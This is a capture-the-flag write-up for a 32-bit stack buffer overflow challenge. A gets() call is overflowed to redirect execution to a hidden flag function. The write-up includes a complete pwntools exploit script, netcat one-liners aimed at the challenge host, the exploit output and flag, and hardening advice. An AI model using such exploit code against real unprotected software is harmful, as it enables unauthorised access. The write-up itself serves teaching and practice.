---
title: "EotW CTF SS CASE IT 2025: Liberation Binary Writeup"
date: "2025-05-27"
description: "A classic buffer overflow exploitation challenge featuring the AI regime resistance theme. Learn how to bypass authentication and access the resistance mainframe through stack-based buffer overflow."
tags: ["pwn", "buffer-overflow", "binary-exploitation", "ctf", "stack", "gets-vulnerability"]
---

## Breaking Free from the AI Regime: A Classic Buffer Overflow

**Category**: PWN  
**Points**: 150  
**Description**: The AI regime has locked down their systems, but 0x4m4 has found a way in. Can you exploit this authentication binary to access the resistance mainframe and retrieve the secret intelligence?

## Initial Analysis

When I first examined the Liberation Binary challenge, I was presented with what appeared to be a secure authentication system for the AI regime's infrastructure. The binary prompts for access credentials, but there's more than meets the eye.

Running the binary initially:
```bash
./liberation_binary
```

The program displays a themed interface and asks for credentials, but always responds with "AUTHENTICATION FAILED" regardless of input. This suggests we need to find an alternative way to gain access.

## Vulnerability Discovery

Looking at the decompiled source code (or through reverse engineering), I found a critical vulnerability in the `login_prompt()` function:

```c
void login_prompt() {
    char buffer[64];
    
    printf("ENTER ACCESS CREDENTIALS: ");
    gets(buffer);  // Vulnerable function - buffer overflow
    
    printf("\nAUTHENTICATION FAILED: Invalid credentials\n");
    printf("Your access attempt has been logged.\n");
}
```

The vulnerability exists because:
1. The `gets()` function reads unlimited input into a 64-byte buffer
2. No bounds checking is performed
3. We can overflow the buffer and overwrite the return address
4. There's a hidden function `access_resistance_mainframe()` that reads the flag

## Finding the Target Function

Using `objdump` to analyze the binary:

```bash
objdump -d liberation_binary | grep "access_resistance_mainframe"
```

This reveals the function address. In my case, it was `0x08049196`. We can also use `gdb` to find function addresses:

```bash
gdb ./liberation_binary
(gdb) info functions
```

## Determining the Offset

To exploit the buffer overflow, I needed to find the exact offset from the start of our input to the saved return address. Using `pwntools` to generate a cyclic pattern:

```python
from pwn import *
print(cyclic(100))
```

Running this in `gdb` and analyzing the crash:

```bash
gdb ./liberation_binary
(gdb) run
# Input the cyclic pattern when prompted
(gdb) cyclic -l 0x6161616c  # Using the value that overwrote EIP
76
```

Perfect! The offset is 76 bytes.

## Exploitation

Here's my complete exploit script using `pwntools`:

```python
#!/usr/bin/env python3
from pwn import *

# Set context for 32-bit architecture
context.arch = 'i386'
context.log_level = 'info'

# Connect to the challenge (replace with actual host/port)
# For local testing: conn = process('./liberation_binary')
conn = remote('ctf.0x4m4.com', 9999)

# Address of access_resistance_mainframe() function
# This address should be obtained through static analysis
access_func_addr = 0x08049196

# Craft the payload
log.info(f"Target function address: {hex(access_func_addr)}")
log.info("Crafting buffer overflow payload...")

payload = b'A' * 76  # Padding to reach return address
payload += p32(access_func_addr)  # Overwrite return address

# Send the payload
conn.recvuntil(b"ENTER ACCESS CREDENTIALS: ")
log.info("Sending payload...")
conn.sendline(payload)

# Receive the flag
log.success("Payload sent! Receiving response...")
response = conn.recvall().decode()
print(response)

# Extract and display the flag
if "sscit{" in response:
    flag_start = response.find("sscit{")
    flag_end = response.find("}", flag_start) + 1
    flag = response[flag_start:flag_end]
    log.success(f"Flag captured: {flag}")

conn.close()
```

## Alternative Exploitation Methods

### Command Line One-liner

For a quick exploit without Python:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*76 + b'\x96\x91\x04\x08')" | nc ctf.0x4m4.com 9999
```

### Pure Bash Solution

If Python isn't available:

```bash
(perl -e 'print "A"x76 . "\x96\x91\x04\x08"'; cat) | nc ctf.0x4m4.com 9999
```

The `cat` command keeps the connection open to receive the flag output.

## Running the Exploit

When I executed the exploit, here's what happened:

```bash
python3 exploit.py
[*] Target function address: 0x8049196
[*] Crafting buffer overflow payload...
[*] Sending payload...
[+] Payload sent! Receiving response...

AUTHENTICATION FAILED: Invalid credentials
Your access attempt has been logged.

ACCESSING RESISTANCE MAINFRAME...
DECRYPTING CLASSIFIED INTELLIGENCE...

FLAG: sscit{h4ck1ng_th3_m41nfr4m3_r3s1st4nc3_w1ll_pr3v41l}

TRANSMISSION COMPLETE - RESISTANCE LIVES ON!

[+] Flag captured: sscit{h4ck1ng_th3_m41nfr4m3_r3s1st4nc3_w1ll_pr3v41l}
```

## Technical Deep Dive

### Stack Layout Analysis

The stack layout during the overflow looks like this:

```
High Memory
+------------------+
| Return Address   | <- We overwrite this (offset 76)
+------------------+
| Saved EBP        | (offset 72)
+------------------+
| buffer[64]       | <- Our input starts here
+------------------+
Low Memory
```

### Why This Works

1. **No Stack Canaries**: The binary wasn't compiled with stack protection
2. **No ASLR**: Function addresses are predictable
3. **Executable Stack**: Not relevant here since we're doing ret2func
4. **Unsafe Function**: `gets()` has no bounds checking

## Key Learnings

This challenge reinforced several important concepts:

1. **Input Validation**: Always validate input length and use safe functions
2. **Stack Protection**: Modern compilers include protections like stack canaries
3. **ASLR**: Address Space Layout Randomization makes exploitation harder
4. **Static Analysis**: Understanding binary structure is crucial for exploitation

## Prevention Measures

To prevent this vulnerability:

1. **Use Safe Functions**: Replace `gets()` with `fgets()` or `scanf()` with length limits
2. **Compiler Protections**: Enable stack canaries (`-fstack-protector`)
3. **ASLR**: Enable address space randomization
4. **NX Bit**: Make stack non-executable
5. **Input Validation**: Always check input bounds

```c
// Secure version
void secure_login_prompt() {
    char buffer[64];
    printf("ENTER ACCESS CREDENTIALS: ");
    fgets(buffer, sizeof(buffer), stdin);  // Safe function with bounds
    // ... rest of function
}
```

## Conclusion

The Liberation Binary challenge was an excellent introduction to classic buffer overflow exploitation. By leveraging the unsafe `gets()` function, I was able to redirect program execution to the hidden `access_resistance_mainframe()` function and retrieve the flag.

This type of vulnerability, while basic, forms the foundation for understanding more complex exploitation techniques. The themed narrative around the AI regime resistance added an engaging storyline to the technical challenge.

The flag was: `sscit{h4ck1ng_th3_m41nfr4m3_r3s1st4nc3_w1ll_pr3v41l}`

Remember: In the fight against oppressive AI regimes, sometimes the oldest tricks are the most effective! 🔓 